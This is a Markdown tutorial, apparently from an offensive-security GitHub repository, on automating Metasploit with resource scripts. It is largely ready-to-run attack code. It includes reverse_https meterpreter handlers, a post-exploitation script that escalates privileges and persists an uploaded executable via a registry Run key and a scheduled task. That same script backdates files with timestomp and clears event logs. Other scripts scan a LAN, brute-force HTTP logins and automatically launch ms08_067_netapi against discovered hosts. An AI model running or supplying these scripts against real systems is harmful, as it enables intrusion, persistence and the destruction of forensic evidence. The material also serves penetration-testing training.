## METASPLOIT RESOURCE FILES

<blockquote>Resource scripts provide an easy way for you to automate repetitive tasks in Metasploit. Conceptually they're just like batch scripts. They contain a set of commands that are automatically and sequentially executed when you load the script in Metasploit. You can create a resource script by chaining together a series of Metasploit console commands and by directly embedding Ruby to do things like call APIs, interact with objects in the database, and iterate actions.</blockquote>

![pic](http://i68.tinypic.com/21ovkfm.jpg)

| article chapters | jump links | command syntax |
|-------|---|---|
| what are resource files? | [metasploit resource scripts](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#how-to-run-resource-scripts) | msfconsole -x 'help grep resource' |
| how to run resource scripts?| [how to run resource scripts](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#how-to-run-resource-scripts) | msfconsole -r script.rc |
| how to write resource scripts? | [how to write resource scripts](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#how-to-write-resource-scripts) | makerc /root/script.rc | 
| RC scripts in post exploitation | [resource scripts in post exploitation](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#resource-scripts-in-post-exploitation) | run migrate -n explorer.exe |
| RC scripts in AutoRunScript | [resource scripts in AutoRunScript](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#resource-scripts-in-autorunscript) | set AutoRunScript /root/script.rc |
| using ruby (ERB scripting) | [using ruby in RC (ERB scripting)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#using-ruby-in-rc-erb-scripting) | \<ruby\>framework.db.hosts.each do \|h\|\</ruby\> |
| exercises with resource scripts | [exercises with resource scripts](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#exercises) | exercises external links |

<br />

## REFERENCIES

- [Rapid7 Resource Files](https://metasploit.help.rapid7.com/docs/resource-scripts)
- [Msfconsole Core Commands](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/)
- [Meterpreter Core Commands](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
- [My Metasploit API Cheat Sheet](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md)
- [Offensiveinfosec Writing Resource Scripts](https://offensiveinfosec.wordpress.com/2012/04/08/writing-resource-scripts-for-the-metasploit-framework/) 

---

<br /><br /><br />

##  HOW TO RUN RESOURCE SCRIPTS?
<blockquote>You can run resource scripts from msfconsole or from the web interface. Before you can run a resource script, you need to identify the required parameters that need to be configured for the script to run. If you're a Metasploit Framework user, you can run a resource script from msfconsole or meterpreter prompt with the resource command or you can run a resource script when you start msfconsole with the -r flag (making msfconsole executing the resource script at startup).</blockquote>

- **Run::from::msfconsole::start**

      msfconsole -r script.rc
      msfconsole -r /root/script.rc

<br />

- **Run::from::inside::msfconsole**

      msf > resource /root/script.rc
      meterpreter > resource /root/script.rc

<br />

- **Run::from::inside::meterpreter**

      msf exploit(multi/handler) > resource /root/script.rc

<blockquote>Remmenber: To start postgresql service before using msf: sudo service postgresql start</blockquote>

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## HOW TO WRITE RESOURCE SCRIPTS?
<blockquote>There are two ways to create a resource script, which are creating the script manually or using the makerc command. Personally i recommend the makerc command over manual scripting, since it eliminates typing errors. The makerc command saves all the previously issued commands into a file, which can be used with the resource command.</blockquote>

- **Resource file to display the version number of metasploit::**`[script: version.rc]`<br />

```
  version
  exit -y
```
`[run]` msfconsole -r /root/version.rc

<br />

- **Resource file to display the version number of metasploit (makerc)::**`[script: version.rc]`<br />
```
   kali > msfconsole
   msf > version
   msf > makerc /root/version.rc
```
`[run] msf >` resource /root/version.rc

<br /><br />

<blockquote>In the next example we are going to write one handler resource file, because there are times when we 'persiste' our payload in target system and a few days later we dont remmenber the handler configurations set that day, thats one<br />of the reasons rc scripting can be usefull, besides automating the framework (erb scripting can access metasploit api).</blockquote>

- **Resource file to start one handler::**`[script: handler.rc]`<br />

```
   use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_https
   set ExitOnSession false
   set LHOST 192.168.1.71
   set LPORT 666
   exploit
```
`[run]` msfconsole -r /root/handler.rc

<br />

- **Resource file to start one handler (makerc)::**`[script: handler.rc]`<br />

```
   kali > msfconsole
   msf > use exploit/multi/handler
   msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_https
   msf exploit(multi/handler) > set ExitOnSession false
   msf exploit(multi/handler) > set LHOST 192.168.1.71
   msf exploit(multi/handler) > set LPORT 666
   msf exploit(multi/handler) > exploit

   msf exploit(multi/handler) > makerc /root/handler.rc
```
`[run] msf >` resource /root/handler.rc

<br /><br />

<blockquote>The next resource script allow us to record msfconsole activity under logfile.log and commands.rc<br />It also displays database information sutch as: framework version, active sessions in verbose mode, loads my auxiliary scripts local directory into msfdb (loading my modules) and executes the rc script handler.rc at msfconsole startup.</blockquote>

- **Resource file to record session activity, load my auxiliarys and exec handler.rc::**`[script: record.rc]`<br />

```
   spool /root/logfile.log
   version
   sessions -v
     loadpath /root/msf-auxiliarys
     resource /root/handler.rc
   makerc /root/commands.rc
```
`[run]` msfconsole -r /root/record.rc

![gif](http://i68.tinypic.com/343oefb.gif)

<br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## RESOURCE SCRIPTS IN POST EXPLOITATION
<blockquote>Auto-run scripts are great when you need multiple modules to run automatically. Lets assume the first thing(s) we do after a successfully exploitation its to elevate the current session to NT authority/system, take a screenshot of current desktop, migrate to another process and run post exploitation modules. Having all this commands inside a rc script saves us time.</blockquote>

- **Resource script to elevate session, take screenshot, migrate and run post-modules::**`[script: post.rc]`<br />

```
   getprivs
   getsystem
   screenshot
   migrate -n wininit.exe
     use post/windows/gather/enum_applications
   run
     use post/multi/recon/local_exploit_suggester
   run
```
`[run] meterpreter >` resource /root/post.rc

<br /><br />

<blockquote>Auto-run scripts are great when you need to persiste fast your payload automatically. This next example demonstrates how to use resource scripts to successfully persiste a payload in target system and clean tracks (timestomp & clearev) after exploitation using meterpreter core commands written inside one resource script.</blockquote>

- **Resource script to elevate session, migrate, persiste payload and clear tracks::**`[persistence.rc]`<br />

```
   getprivs
   getsystem
   migrate -n explorer.exe
      upload update.exe %temp%\\update.exe
      timestomp -z '3/10/1999 15:15:15' %temp%\\update.exe
      reg setval -k HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run -v flash-update -d %temp%\\update.exe
      scheduleme -m 10 -c "%temp%\\update.exe"
   clearev
```
`[run] meterpreter >` resource /root/persistence.rc

<br /><br />

<blockquote>In the next resource script all auxiliary modules require that RHOSTS and THREADS options are set before running the modules. In the next example we are using SETG (global variable declarations) to configurate all the options that we need before running the modules. So its advice before writing a resource file like this one, to first check what options are required for the auxiliary to run. The next rc script will run 3 auxiliary modules againts all hosts found inside local lan.</blockquote>

- **Using SETG global variable to config auxiliary(s) modules options::**`[script: http_brute.rc]`<br />

```
   setg THREADS 15
   setg RHOSTS 192.168.1.254
     use auxiliary/scanner/http/http_version
   run
     use auxiliary/scanner/http/dir_scanner
   run
     use auxiliary/scanner/http/http_login
   run
   unsetg RHOSTS THREADS
```
`[run]` msfconsole -r /root/http_brute.rc

![gif](http://i66.tinypic.com/2usid92.gif)

<br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## RESOURCE SCRIPTS IN AutoRunScript
<blockquote>This next example demonstrates how we can auto-run our resource script automatically at session creation with the help of @darkoperator 'post/multi/gather/multi_command.rb' and msfconsole 'AutoRunScript' handler flag, for this to work we need to define a global variable (setg RESOURCE /root/gather.rc) to call our resource script at session creation.</blockquote>

- **RC::Post-Exploit::Script::Gather::**`[script: gather.rc]`<br />

```
   sysinfo
   getuid
   services
   sessions -v
```

- **RC::AutoRunScript::Handler::**`[script: post_handler.rc]`<br />

```
   setg RESOURCE /root/gather.rc
      use exploit/multi/handler
      set AutoRunScript post/multi/gather/multi_command
      set PAYLOAD windows/meterpreter/reverse_https
      set ExitOnSession false
      set LHOST 192.168.1.71
      set LPORT 666
   exploit
   unsetg RESOURCE
```
`[run]` msfconsole -r /root/post_handler.rc

<br /><br />

- **Handler::AutoRunScript::OneLiner::**`[msfconsole prompt]`<br />
<blockquote>The easy way to reproduce this is: execute one multi/handler with the 'AutoRunScript' flag executing @darkoperator 'multi_console_command' script with the -rc argument pointing to the absoluct path of our gather.rc script. That will execute our gather.rc (auto-running our resource script automatically at session creation).</blockquote>

      sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD windows/meterpreter/reverse_https; set AutoRunScript multi_console_command -rc /root/gather.rc; exploit'

![gif](http://i67.tinypic.com/20aotfr.gif)

<br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## USING RUBY IN RC (ERB scripting)
<blockquote>ERB is a way to embed Ruby code directly into a document. This allow us to call APIs that are not exposed<br />via console commands and to programmatically generate and return a list of commands based on their own logic.<br />Basically ERB scripting its the same thing that writing a metasploit module from scratch using "ruby" programing language and some knowledge of metasploit (ruby) API calls. One of the advantages of using ERB scripting is<br />that we can use simple msfconsole or meterpreter commands together with ruby syntax or metasploit APIs.</blockquote>

- **Running ruby code inside resource files::**`[script: template.rc]`<br />

```
<ruby>
   help = %Q|
    Description:
       This Metasploit RC file can be used to automate the exploitation process.
       In this example we are just checking msfdb connection status, list database
       hosts, services and export the contents of database to template.xml local file.
    Author:
       r00t-3xp10it  <pedroubuntu10[at]hotmail.com>
    |
    print_line(help)
    Rex::sleep(1.5)

       print_good("checking database connection")
       Rex::sleep(2)
       run_single("db_status")
       print_good("checking database sevices")
       Rex::sleep(2)
       run_single("services")
       print_good("checking database hosts")
       Rex::sleep(2)
       run_single("hosts")

   print_warning("exporting database to: template.xml")
   Rex::sleep(1.5)
   run_single("db_export -f xml template.xml")
</ruby>
```
`[run]` msfconsole -r /root/template.rc

<br /><br />

<blockquote>The next resource script uses db_nmap metasploit core command to populate the msfdb database with hosts (address), then the ruby function will check what hosts has been capture and run 3 post-exploitation modules againts all hosts stored inside the msfdb database.</blockquote>

- **Scan local lan with nmap and run auxiliary(s)::**`[script: http_title.rc]`<br />

```
db_nmap -sV -Pn -T4 -p 80 --open --reason 192.168.1.0/24
services
   <ruby>
     xhost = framework.db.hosts.map(&:address).join(' ')
           run_single("setg RHOSTS #{xhost}")
           print_good("######### http title auxiliary #########")
           run_single("use auxiliary/scanner/http/title")
           run_single("exploit")
           print_good("######### dir_scanner auxiliary #########")
           run_single("use auxiliary/scanner/http/dir_scanner")
           run_single("exploit")
           print_good("######### http_login auxiliary ##########")
           run_single("use auxiliary/scanner/http/http_login")
           run_single("exploit")
   </ruby>
unsetg RHOSTS
```
`[run]` msfconsole -r /root/http_title.rc

<br /><br />

<blockquote>Run auxiliary/exploit modules based on database (targets) ports found. Next resource script searchs inside msf database for targets open ports discover by db_nmap scan to sellect what auxiliary/exploits modules to run againts target system.</blockquote>

- **Run auxiliary/exploit modules based on database (targets) ports found::**`[script: recon.rc]`<br />

```
db_nmap -sV -Pn -T4 -p 80,445,139 --open --reason 192.168.1.0/24
services
   <ruby>
      xhost = framework.db.hosts.map(&:address).join(' ')
      xport = framework.db.services.map(&:port).join(' ')
      run_single("setg RHOSTS #{xhost}")

         if xport =~ /80/i
              print_status("## Target port: 80 http found")
              print_good("## Running port 80 auxiliary/exploits.")
              run_single("use auxiliary/scanner/http/title")
              run_single("exploit")
              print_good("######### dir_scanner auxiliary #########")
              run_single("use auxiliary/scanner/http/dir_scanner")
              run_single("exploit")
              print_good("######### http_login auxiliary #########")
              run_single("use auxiliary/scanner/http/http_login")
              run_single("exploit")
         end

         if xport =~ /445/i
              print_status("## Target port: 445 https found")
              print_good("## Running port 445 auxiliary/exploits.")
              run_single("use exploit/windows/smb/ms08_067_netapi")
              run_single("exploit")
         end

         if xport =~ /139/i
              print_status("## Target port: 139 smb found")
              print_good("## Running port 139 auxiliary/exploits.")
              run_single("use exploit/windows/smb/ms08_067_netapi")
              run_single("exploit")
         end
   </ruby>
unsetg RHOSTS
```
`[run]` msfconsole -r /root/recon.rc

<br /><br />

- **snmp_enum::post::exploitation::**`[script: snmp_enum.rc]`<br />

```
setg RHOSTS 192.168.1.71 192.168.1.254
   <ruby>
      print_line("")
      print_status("Please wait, checking if RHOSTS are set globally.")
      if (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')
         print_error("[ERROR] Please set RHOSTS globally: setg RHOSTS xxx.xxx.xxx.xxx")
         return nil
      end

         # Using nmap to populate metasploit database (db_nmap)
         print_good("RHOSTS set globally [ OK ] running scans.")
            run_single(\"db_nmap -sU -sS -Pn -n --script=smb-check-vulns.nse,samba-vuln-cve-2012-1182 --script-args=unsafe=1 -p U:135,T:139,445 #{framework.datastore['RHOSTS']}\")
            # Displays msf database results stored into 'services' and 'vulns'
            run_single("services")
            run_single("vulns")

      print_good("Please wait, running msf auxiliary modules.")
      run_single("use auxiliary/scanner/snmp/snmp_enum")
      run_single("exploit")
      run_single("use auxiliary/scanner/snmp/snmp_enumusers")
      run_single("exploit")
      run_single("use auxiliary/scanner/snmp/snmp_enumshares")
      run_single("exploit")
   </ruby>
unsetg RHOSTS
```
`[run]` msfconsole -r /root/snmp_enum.rc

<br />

![pic](http://i66.tinypic.com/2ywxvf7.png)

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## EXERCISES

- [exercise 1](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/RC%5BERB%5D%20basic%20notions%20lesson%204)<br />
- [exercise 2](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/RC%5BERB%5D%20basic%20notions%20lesson%205)<br />
- [exercise 3 (ERB)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/RC%5BERB%5D%20basic%20notions%20lesson%207)<br />
- [exercise 4 (ERB)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/RC%5BERB%5D%20basic%20notions%20lesson%208)<br />

<br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## Suspicious Shell Activity (Red Team) @2019


